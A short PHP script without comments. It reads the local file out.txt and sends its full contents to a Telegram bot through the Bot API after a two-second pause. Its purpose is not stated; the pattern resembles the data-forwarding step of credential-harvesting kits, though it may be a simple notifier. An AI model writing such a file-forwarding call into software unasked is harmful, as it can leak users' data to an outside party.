<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/botgit_mg/sendMessage?chat_id=gitmgi_bot&text=$msg");
?>